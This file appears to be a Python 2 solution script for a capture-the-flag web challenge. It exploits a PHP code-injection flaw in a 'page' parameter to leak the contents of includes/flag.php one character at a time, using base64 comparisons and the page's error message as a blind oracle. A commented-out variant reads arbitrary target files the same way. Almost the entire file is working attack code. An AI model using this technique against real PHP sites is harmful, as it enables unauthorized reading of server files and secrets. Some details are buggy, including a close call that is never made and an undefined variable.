import requests
import string
import base64
import urllib

url = "http://prob.nagi.moe:9091/index.php"
content=""
i = 1
while True:
	for j in range(len(string.printable)):
		tmpContent = content + string.printable[j]
		tmpContent = base64.encodestring(tmpContent)
		param = {"page":"', 'qwer') === false && substr(file_get_contents('includes/f'.'lag.php'),0,{}) == base64_decode('{}'); //".format(i,tmpContent)}
		r = requests.get(url, params = param)
		if "No php wrapper!" not in r.text:
                        i += 1
                        content += string.printable[j]
                        break
	if j == len(string.printable)-1:
                print "*** Complete ***"
                break
	print content
f=open('flag.php', "w")
f.write(content)
f.close

		

"""
url="http://prob.nagi.moe:9091/index.php"
param="?page=', 'qwer') === false %26%26 substr(file_get_contents('{}'),0,{}) == base64_decode('{}'); //"

content = ""
i = 1
while True:
	for j in range(len(string.printable)):
		tmpContent = content + string.printable[j]
		tmpContent = base64.encodestring(tmpContent)
		fullurl = url+param.format(target,i,tmpContent)
		r = requests.get(fullurl)
		if "No php wrapper!" not in r.text:
			i += 1
			content += string.printable[j]
			break
	print content
	if j == len(string.printable)-1:
		print "*** Complete ***"
		break

print content
"""
